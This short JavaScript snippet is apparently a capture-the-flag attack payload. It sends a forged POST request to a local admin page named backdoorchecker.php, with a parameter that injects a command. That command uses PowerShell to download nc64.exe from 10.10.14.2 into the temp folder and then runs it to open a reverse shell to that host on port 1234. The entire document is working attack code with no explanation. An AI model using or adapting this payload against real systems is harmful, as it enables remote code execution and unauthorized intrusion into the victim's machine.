var request = new XMLHttpRequest();
params = 'cmd=dir|powershell -c "iwr -uri http://10.10.14.2/nc64.exe -OutFile %temp%\\nc64.exe"; %temp%\\nc64.exe -e cmd 10.10.14.2 1234';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
request.send(params);

